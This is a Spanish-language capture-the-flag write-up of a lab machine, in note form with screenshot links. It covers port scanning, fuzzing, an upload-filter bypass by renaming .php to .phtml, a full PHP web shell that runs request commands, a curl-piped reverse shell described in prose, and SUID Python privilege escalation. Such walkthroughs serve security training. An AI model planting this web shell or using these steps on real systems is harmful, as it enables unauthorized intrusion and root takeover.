Haremos los reconococimientos de nmap y vemos el puerto 80 y 22 abiertos:
![[Pasted image 20230401011056.png]]
Si vemos la web es esta:
![[Pasted image 20230401011433.png]]
Si hacemos fuzzing nos encontramos con un directorio de panel y otro de uploads:
![[Pasted image 20230401011851.png]]
En el directorio de panel tenemos un lugar donde subir archivos:
![[Pasted image 20230401011932.png]]
Si subimos un fichero .php malicioso nos va a dar error, pero el truco será en interceptar la petición web y así poder cambiar la extensión del fichero php por un phtml:
```python
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
![[Pasted image 20230401013139.png]]
Y entonces ahora podremos subirlo y llamar a este archivo para obtener ejecución remota de comandos:
![[Pasted image 20230401013213.png]]
![[Pasted image 20230401013225.png]]
Ahora nos creamos un servidor web con python que aloje el código para enviarnos una reverse shell y después lo llamamos y pipeamos con curl:
![[Pasted image 20230401014657.png]]
![[Pasted image 20230401014615.png]]
![[Pasted image 20230401014628.png]]
![[Pasted image 20230401014638.png]]
Si hacemos una búsqueda de los permisos SUID, vemos que Python se encuentra entre ellos:
![[Pasted image 20230401015128.png]]
Y también vemos estos permisos para Python:
![[Pasted image 20230401015233.png]]
Por tanto nos creamos un fichero de Python con un código que nos permita escalar privilegios:
![[Pasted image 20230401015723.png]]
Lo compartimos con la máquina víctima:
![[Pasted image 20230401015746.png]]
Y lo ejecutamos para convertirnos en root:
![[Pasted image 20230401015812.png]]
![[Pasted image 20230401015823.png]]
[[Escalada de Privilegios con Python]]